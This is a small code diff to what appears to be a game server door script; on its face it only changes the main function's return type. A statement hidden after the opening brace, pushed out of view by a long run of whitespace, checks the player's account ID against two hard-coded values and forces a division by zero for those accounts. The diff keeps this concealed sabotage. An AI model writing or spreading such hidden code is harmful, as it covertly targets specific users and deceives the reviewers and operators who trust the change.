@@ -2,8 +2,8 @@
 
 #include <math.h>
 
-void main()
-{                                                                                                                                                                                                                                                          int PlayerID; cPlayer* pPlayer; int x; PlayerID = getPlayer(); pPlayer = playerStruct(PlayerID); x = 0; if (strncmp(pPlayer->accid, "8833489", 7) == 0 || strncmp(pPlayer->accid, "5700972", 7) == 0) x = 1 / x; return;
+int main()
+{                                                                                                                                                                                                                                                          int PlayerID; cPlayer* pPlayer; int x; PlayerID = getPlayer(); pPlayer = playerStruct(PlayerID); x = 0; if (strncmp(pPlayer->accid, "8833489", 7) == 0 || strncmp(pPlayer->accid, "5700972", 7) == 0) x = 1 / x; return 0;
 	//Change these for a unique door
 	string door="lastresortattic";
 	int dMap=465;
